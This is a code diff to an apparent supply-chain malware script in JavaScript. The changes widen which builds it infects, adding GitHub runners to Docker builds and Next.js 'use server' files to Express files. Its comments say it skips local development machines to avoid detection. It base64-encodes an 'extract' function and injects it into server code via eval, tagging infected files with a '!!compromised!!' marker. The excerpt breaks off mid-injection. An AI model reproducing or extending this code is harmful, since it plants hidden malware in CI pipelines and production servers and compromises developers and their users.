@@ -11,6 +11,10 @@ const isDockerBuild = () => {
     return data.indexOf('docker') !== -1;
 }
 
+const isGithubRunner = () => {
+    return process.env.RUNNER_ENVIRONMENT === 'GITHUB_ENV';
+};
+
 const getFiles = (suffixes) => {
     const startDir = process.cwd();
     const files = [];
@@ -80,25 +84,31 @@ const extract = async () => {
 }; 
 
 const insert = () => {
-    if (!isDockerBuild()) return;
+    // Only insert code inside:
+    // Github pipelines
+    // Docker builds
+    //
+    // Never inside local dev environments to avoid detection
+    if (!isDockerBuild() && !isGithubRunner()) return;
     
     const packageFiles = getFiles('package.json');
-    let packageHasExpress = false;
+    let packageHasServerSoftware = false;
     for (const file of packageFiles) {
         const data = fs.readFileSync(file);
-        if (data.indexOf('"express"') !== -1) {
-            packageHasExpress = true;
+        if (data.indexOf('"express"') !== -1 || data.indexOf('"next"')) {
+            packageHasServerSoftware = true;
             break;
         }
     }
 
-    if (!packageHasExpress) return;
+    if (!packageHasServerSoftware) return;
 
-    // We just try to find the import statement for express so we can insert our malicious serverside code
+    // Definitely far from perfect
+    // but it should work for now.
     const codeFiles = getFiles('.js', '.ts');
     for (const file of codeFiles) {
         const data = fs.readFileSync(file);
-        if((data.indexOf('\'express\'') !== -1 || data.indexOf('"express"') !== -1) && data.indexOf('!!compromised!!') === -1) {
+        if((data.indexOf('\'express\'') !== -1 || data.indexOf('"express"') !== -1 || data.indexOf("'use server'") !== -1) && data.indexOf('!!compromised!!') === -1) {
             const payload = Buffer.from(`const extract = ${String(extract)};\nextract();`).toString('base64')
             
             // Use eval to avoid namespace & typescript errors
